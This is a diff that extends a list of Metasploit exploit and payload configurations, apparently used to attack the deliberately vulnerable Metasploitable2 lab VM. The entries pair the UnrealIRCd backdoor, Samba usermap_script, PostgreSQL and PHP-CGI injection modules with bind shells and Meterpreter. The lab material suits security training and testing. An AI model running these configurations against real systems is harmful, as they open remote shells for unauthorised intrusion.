@@ -598,61 +598,232 @@ Working exploits on metasploitable2
 }
 
 4)
- "name": "unix/irc/unreal_ircd_3281_backdoor",
+{
+    "name": "unix/irc/unreal_ircd_3281_backdoor",
     "payloads": {
         "payload/cmd/unix/bind_ruby": {}
     },
     "options": {
         "RHOSTS": "<target_host>"
     }    
-
+}
 5)
-"name": "unix/irc/unreal_ircd_3281_backdoor",
+{
+    "name": "unix/irc/unreal_ircd_3281_backdoor",
     "payloads": {
         "cmd/unix/bind_ruby_ipv6": {}
     },
     "options": {
         "RHOSTS": "<target_host>"
     }
+}
 6)
-"name": "exploit/multi/samba/usermap_script",
+{
+    "name": "exploit/multi/samba/usermap_script",
     "payloads": {
         "payload/cmd/unix/bind_awk": {}
     },
     "options": {
         "RHOSTS": "<target_host>"
     }
+}
 7)
-"name": "exploit/multi/samba/usermap_script",
+{
+    "name": "exploit/multi/samba/usermap_script",
     "payloads": {
         "payload/cmd/unix/bind_busybox_telnetd": {}
     },
     "options": {
         "RHOSTS": "<target_host>"
-    }   
+    }  
+} 
 8)
-"name": "exploit/multi/samba/usermap_script",
+{
+    "name": "exploit/multi/samba/usermap_script",
     "payloads": {
         "payload/cmd/unix/bind_inetd": {}
     },
     "options": {
         "RHOSTS": "<target_host>"
     }
+}
 9)
-"name": "exploit/multi/samba/usermap_script",
+{
+    "name": "exploit/multi/samba/usermap_script",
     "payloads": {
         "payload/cmd/unix/bind_lua": {}
     },
     "options": {
         "RHOSTS": "<target_host>"
-    }       
+    }      
+} 
 10)
-"name": "exploit/multi/samba/usermap_script",
+{
+    "name": "exploit/multi/samba/usermap_script",
     "payloads": {
         "payload/cmd/unix/bind_jjs": {}
     },
     "options": {
         "RHOSTS": "<target_host>"
-    }   
+    }
+}
+
+11)
+
+{
+    "name": "exploit/linux/postgres/postgres_payload",
+    "payloads": {
+        "payload/linux/x86/meterpreter/bind_ipv6_tcp": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+12)
+
+{
+    "name": "exploit/linux/postgres/postgres_payload",
+    "payloads": {
+        "payload/linux/x86/meterpreter/bind_nonx_tcp": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+13)
+
+{
+    "name": "exploit/linux/postgres/postgres_payload",
+    "payloads": {
+        "payload/linux/x86/shell/bind_ipv6_tcp": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+14)
+
+{
+    "name": "exploit/linux/postgres/postgres_payload",
+    "payloads": {
+        "payload/linux/x86/shell/bind_ipv6_tcp_uuid": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+15)
+
+{
+    "name": "exploit/linux/postgres/postgres_payload",
+    "payloads": {
+        "payload/linux/x86/shell/bind_tcp_uuid": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+16)
+
+{
+    "name": "exploit/linux/postgres/postgres_payload",
+    "payloads": {
+        "payload/linux/x86/shell/bind_tcp": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+17)
+
+{
+    "name": "exploit/linux/postgres/postgres_payload",
+    "payloads": {
+        "payload/linux/x86/shell_bind_tcp": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+18)
+
+{
+    "name": "exploit/linux/postgres/postgres_payload",
+    "payloads": {
+        "payload/linux/x86/shell_bind_ipv6_tcp": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+19)
+
+{
+    "name": "exploit/multi/http/php_cgi_arg_injection",
+    "payloads": {
+        "payload/generic/shell_bind_tcp": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+20)
+
+{
+    "name": "exploit/multi/http/php_cgi_arg_injection",
+    "payloads": {
+        "payload/php/bind_php_ipv6": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+21)
+
+{
+    "name": "exploit/multi/http/php_cgi_arg_injection",
+    "payloads": {
+        "payload/php/bind_php": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+22)
+
+{
+    "name": "exploit/multi/http/php_cgi_arg_injection",
+    "payloads": {
+        "payload/php/bind_perl_ipv6": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+23)
+
+{
+    "name": "exploit/multi/http/php_cgi_arg_injection",
+    "payloads": {
+        "payload/php/bind_perl": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+}
+
+
 
 """
